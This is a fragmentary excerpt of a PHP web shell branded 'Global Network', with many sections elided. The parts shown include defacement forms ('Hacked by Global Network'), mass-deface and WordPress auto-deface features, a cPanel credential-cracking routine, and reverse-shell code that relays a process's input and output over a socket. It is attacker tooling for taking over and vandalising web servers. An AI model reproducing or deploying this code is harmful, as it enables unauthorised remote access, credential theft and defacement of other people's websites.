...
html {
	 background: url(http://2.bp.blogspot.com/-sUp5YgxMbRc/VSvhOy8rN9I/AAAAAAAAASA/P6XXHjDdWPM/s1600/Wallpaper%2Bkeren%2B25.jpg) no-repeat center center fixed; 
...
echo "<from><center><h3><font size=4 face=chiller color=aqua>Global Network</h3></center><textarea cols=70 rows=20 style='onfocus();font-weight:bold;color:red;background-image: transparent;opacity:0.40;background-size:100%;background-repeat: no-repeat;' class='inputz' readonly>".$html."</textarea><BR/><BR/></center></from>";
?>
...
if (eregi('200', $headers[0])) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Global Network</textarea><br>
...
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}	
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Global Network Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Global Network.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
echo "<center><form method='post'>
		...
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Global Network'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
 ...
 elseif($_GET['do'] == 'adminer') {
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by global network' required><br>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='https://globals-network.blogspot.com/' target='_blank'><font color=lime>Global Network</font></a></center>";
}
?>
</html>